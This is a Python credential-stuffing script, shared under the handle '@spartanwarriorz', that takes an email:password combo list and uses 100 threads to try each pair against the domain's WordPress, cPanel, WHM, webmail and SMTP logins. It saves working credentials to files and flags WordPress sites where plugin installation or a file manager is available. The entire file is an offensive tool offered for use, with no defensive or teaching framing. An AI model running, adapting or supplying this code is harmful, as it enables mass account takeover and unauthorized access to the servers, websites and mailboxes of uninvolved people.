import sys
import requests
import re
import smtplib
import os
import time
from multiprocessing.dummy import Pool
from colorama import Fore, init

init(autoreset=True)

# Color codes
fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fg = Fore.GREEN
fm = Fore.MAGENTA
fy = Fore.YELLOW
fb = Fore.BLUE

requests.urllib3.disable_warnings()

def log():
    init(autoreset=True)

    log_text = """
        [#] Shared by:
                           @spartanwarriorz
"""

    options = [
        ["[*]", "Crack WP panel from Combo List"],
        ["[*]", "Crack cPanel from Combo List"],
        ["[*]", "Crack SMTP from Combo List"],
        ["[*]", "Crack WHM from Combo List"],
        ["[*]", "Crack Webmails from Combo List"]
    ]

    # Color codes
    color_codes = {
        "1": Fore.RED,
        "2": Fore.GREEN,
        "3": Fore.BLUE,
        "4": Fore.YELLOW
    }

    for line in log_text.split("\n"):
        print(line)
        time.sleep(0.15)
    
    header = f"{Fore.CYAN}Option{Fore.WHITE} - Description"
    print(header)
    print("-" * len(header))  # Print a separator line
    for opt in options:
        color_code = color_codes.get(opt[0], Fore.WHITE)
        print(f"{color_code}{opt[0]}{Fore.WHITE} - {opt[1]}")
    print('\n')

def URLdomain_Ova(site):
    if site.startswith("http://"):
        site = site.replace("http://", "")
    elif site.startswith("https://"):
        site = site.replace("https://", "")
    if 'www.' in site:
        site = site.replace("www.", "")
    if '/' in site:
        site = site.rstrip()
        site = site.split('/')[0]
    return site

def SMTP_ova(c):
    try:
        c = c.split(':')
        email = c[0]
        pwd = c[1]
        host = URLdomain_Ova(email.split('@')[1])
        ports = ['587', '25', '465']
        for port in ports:
            try:
                if port == '465':
                    server = smtplib.SMTP_SSL(host, port)
                else:
                    server = smtplib.SMTP(host, port)
                server.starttls()
                server.login(email, pwd)
                smtp = '{}|{}|{}|{}'.format(host, port, email, pwd)
                
                with open('SMTPs.txt', 'a') as file:
                    file.write(smtp + '\n')
                print(f'[GOOD] {fc}{smtp} ---> [SMTP]')
                break
            except:
                pass
    except:
        pass

def CpanelChecker_ova(c):
    try:
        c = c.split(':')
        email = c[0]
        pwd = c[1]
        domain = URLdomain_Ova(email.split('@')[1])
        user1 = domain.split('.')[0]
        user2 = domain.replace(".", "")
        user4 = email.split('@')[0]
        user4s = email.replace("@", "")

        users = [user1, user2, user4s]
        
        if len(user1) > 8:
            user3 = user1[:8]
            users.append(user3) 
        for user in users:
            try:
                postlogin = {'user': user, 'pass': pwd, 'login_submit': 'Log in', 'goto_uri': '/'}
                
                login = requests.post(f'https://{domain}:2083/login/', verify=False, data=postlogin, timeout=15).content
            except:
                login = requests.post(f'https://{domain}:2083/login/', data=postlogin, timeout=15).content

            if 'lblDomainName' in login:
                cp = f'https://{domain}:2083|{user}|{pwd}'
                with open('cPanels.txt', 'a') as file:
                    file.write(cp + '\n')
                print(f'[GOOD] {fy}{cp} ---> [cPanel]')
                break
    except:
        pass

def webmaillChecker_ova(c):
    try:
        c = c.split(':')
        email = c[0]
        pwd = c[1]
        domain = URLdomain_Ova(email.split('@')[1])
        user1 = domain.split('.')[0]
        user2 = domain.replace(".", "")
        user4 = email.split('@')[0]
        user4s = email.replace("@", "")

        users = [email, user4s]
        
        if len(user1) > 8:
            user3 = user1[:8]
            users.append(user3) 
        for user in users:
            try:
                postlogin = {'user': user, 'pass': pwd, 'login_submit': 'Log in', 'goto_uri': '/'}
                
                login = requests.post(f'https://{domain}:2096/login/', verify=False, data=postlogin, timeout=15).content
            except:
                login = requests.post(f'https://{domain}:2096/login/', data=postlogin, timeout=15).content

            if 'id_autoresponders' in login:
                cp = f'https://{domain}:2096|{user}|{pwd}'
                with open('WebMail.txt', 'a') as file:
                    file.write(cp + '\n')
                print(f'[GOOD] {fc}{cp} ---> [Webmails]')
                break
    except:
        pass

def whm_ova(c):
    try:
        c = c.split(':')
        email = c[0]
        pwd = c[1]
        domain = URLdomain_Ova(email.split('@')[1])
        user1 = domain.split('.')[0]
        user2 = domain.replace(".", "")
        user4 = email.split('@')[0]
        user4s = email.replace("@", "")

        users = [user1, user2, user4]
        
        if len(user1) > 8:
            user3 = user1[:8]
            users.append(user3) 
        for user in users:
            try:
                postlogin = {'user': user, 'pass': pwd, 'login_submit': 'login'}

                login = requests.post(f'https://{domain}:2087/login/', verify=False, data=postlogin, timeout=15).content
            except:
                login = requests.post(f'https://{domain}:2087/login/', data=postlogin, timeout=15).content

            if 'whm_zone_manager' in login:
                cp = f'https://{domain}:2083|{user}|{pwd}'
                with open('WHM.txt', 'a') as file:
                    file.write(cp + '\n')
                print(f'[GOOD] {fy}{cp} ---> [WHM]')
                break
    except:
        pass

def content_Ova(req):
    try:
        if sys.version_info[0] < 3:
            try:
                return req.content.decode('utf-8')
            except UnicodeDecodeError:
                return str(req.content, 'utf-8')
        else:
            try:
                return req.text
            except UnicodeDecodeError:
                return req.content.decode('utf-8')
    except Exception as e:
        print("Error in content_Ova:")
        return None

def URL_P(panel):
    try:
        admins = ['/wp-login.php', '/admin', '/user']
        for admin in admins:
            if admin in panel:
                return re.findall(re.compile(f'(.*){admin}'), panel)[0]
        return panel.decode('utf-8') if isinstance(panel, bytes) else panel
    except Exception as e:
        print("Error in URL ")
        return None

def WP_Login_UPer(c):
    try:
        c = c.split(':')
        username = c[0]
        password = c[1]
        domain = URLdomain_Ova(username.split('@')[1])
        url = URL_P(domain)
        if url is None:
            return False
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url    
        user1 = url.split('.')[0]
        user2 = url.replace(".", "")
        user4 = username.split('@')[0]
        user4s = username.replace("@", "")
        user5 = 'admin'
        users = [user4, user5]

        if len(user1) > 8:
            user3 = user1[:8]
            users.insert(2, user3)
        
        for user in users:
            try:
                while url[-1] == '/': 
                    url = url[:-1]
                    
                reqFox = requests.session()
                headersLogin = {
                    'Connection': 'keep-alive',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': '1',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
                    'referer': f'{url}/wp-admin/'
                }
                loginPost_Fox = {
                    'log': user,
                    'pwd': password,
                    'wp-submit': 'Log In',
                    'redirect_to': f'{url}/wp-admin/'
                }
                
                try:
                    login_Fox = reqFox.post(f'{url}/wp-login.php', data=loginPost_Fox, headers=headersLogin, verify=False, timeout=30)
                except Exception as ex:
                    print("Login Error")
                    login_Fox = None
                    
                if login_Fox is not None and (URL_P(login_Fox.url) != URL_P(url)):
                    url = URL_P(login_Fox.url)
                    reqFox = requests.session()
                    loginPost_Fox = {
                        'log': user,
                        'pwd': password,
                        'wp-submit': 'Log In',
                        'redirect_to': f'{url}/wp-admin/'
                    }
                    try:
                        login_Fox = reqFox.post(f'{url}/wp-login.php', data=loginPost_Fox, headers=headersLogin, verify=False, timeout=30)
                    except Exception as ex:
                        print("Login Error")
                        login_Fox = None
                if login_Fox is not None:
                    login_Fox = content_Ova(login_Fox)
                    if 'profile/login' in login_Fox:
                        id_wp = re.findall(re.compile('type="hidden" name="force_redirect_uri-(.*)" id='), login_Fox)[0]
                        myuserpro = re.findall(re.compile('name="_myuserpro_nonce" value="(.*)" /><input type="hidden" name="_wp_http_referer"'), login_Fox)[0]
                        loginPost_Fox = {
                            'template': 'login',
                            'unique_id': f'{id_wp}',
                            'up_username': '0',
                            'user_action': '',
                            '_myuserpro_nonce': myuserpro,
                            '_wp_http_referer': '/profile/login/',
                            'action': 'userpro_process_form',
                            f'force_redirect_uri-{id_wp}': '0',
                            'group': 'default',
                            f'redirect_uri-{id_wp}': '',
                            'shortcode': '',
                            f'user_pass-{id_wp}': password,
                            f'username_or_email-{id_wp}': user
                        }
                        try:
                            login_Fox = reqFox.post(f'{url}/wp-admin/admin-ajax.php', data=loginPost_Fox, headers=headersLogin, verify=False, timeout=30)
                        except Exception as ex:
                            print("Login Error")
                            login_Fox = None
                    try:
                        check = content_Ova(reqFox.get(f'{url}/wp-admin/', headers=headersLogin, verify=False, timeout=30))
                    except Exception as ex:
                        print("Check Error")
                        check = None
                    if check is not None and ('wp-admin/profile.php' in check or 'wp-admin/upgrade.php' in check):
                        with open('Successfully_logged_WordPress.txt', 'a') as file:
                            file.write(f'{url}/wp-login.php#{user}@{password}\n')
                        print(f' -| {url} {user} -> Succeeded Login.')
                        if 'plugin-install.php' in check:
                            with open('plugin-install.txt', 'a') as file:
                                file.write(f'{url}/wp-login.php#{user}@{password}\n')
                            print(f' -| {url} {user} -> Succeeded plugin-install.')
                        if 'WP File Manager' in check:
                            with open('filemanager.txt', 'a') as file:
                                file.write(f'{url}/wp-login.php#{user}@{password}\n')
                            print(f' -| {url} {user} -> Succeeded Wp File Manager.')
                        return True
                    else:
                        print(f' -| {url} -> Login Failed.')
                else:
                    print(f' -| {url} -> Login Failed.')
            except Exception as e:
                print(f' -| {url} -> Error occurred')
    except Exception as e:
        print(' -| Error occurred')
    return False

def exploit(c):
    try:
        c = c.strip()
        print(f'{fr}[ERROR]{fw} {c}')
        WP_Login_UPer(c)
        CpanelChecker_ova(c)
        webmaillChecker_ova(c)
        whm_ova(c)
        SMTP_ova(c)
    except:
        pass

def run():
    log()
    try:
        target = open(sys.argv[1], 'r')
    except:
        print(f"\n{fr}[!] Combolist example format -> site-name@domain.com:password ")
        yList = input('\n Input Combolist --> ')
        if not os.path.isfile(yList):
            print(f"\n   {fr}({yList}) File does not exist!\n")
            sys.exit(0)
        target = open(yList, 'r')
    mp = Pool(100)
    mp.map(exploit, target)
    mp.close()
    mp.join()

run()
